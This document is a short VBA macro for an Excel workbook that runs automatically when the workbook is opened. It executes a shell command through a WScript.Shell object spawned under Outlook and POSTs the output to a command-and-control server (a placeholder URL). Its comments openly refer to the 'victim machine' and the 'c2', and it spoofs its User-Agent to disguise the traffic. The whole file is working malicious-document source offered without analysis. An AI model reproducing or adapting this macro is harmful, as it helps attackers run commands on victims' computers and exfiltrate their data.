' function is called when the workbook is opened
Sub Workbook_Open()

    Dim strData As String
    Dim strCommand As String
    
    strOutput = RunCommand("ipconfig")
    MsgBox (strOutput)
    SendToServer (strOutput)
    
End Sub

' function for running commands on the victim machine
Function RunCommand(command As String) As String

    'handle errors
    On Error GoTo error
    
    ' create outlook object
    Set objOL = CreateObject("Outlook.Application")
    
    ' create shell object under the outlook object
    Set WshShell = objOL.CreateObject("Wscript.Shell")
    
    ' exec the command from the new shell object
    Set WshShellExec = WshShell.Exec(command)
    
    ' read the output of the command
    RunCommand = WshShellExec.StdOut.ReadAll
    
Done:
    Exit Function
    
    ' some error handling in case of un-recognized command
error:
    RunCommand = "ERROR"
    
End Function

' function for sending data to the command server
Function SendToServer(data As String)

    ' handle errors
    On Error GoTo error

    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    
    ' set the c2 IP and Port
    Url = "URL"
    
    ' send the data as POST request
    objHTTP.Open "POST", Url, False
    
    ' set user agent to llok more like natural traffic
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    
    ' send the data
    objHTTP.send(data)
    
Done:
    Exit Function
    
    ' some error handling in case of un-recognized command
error:
    MsgBox ("Cannot connect to server")
    
End Function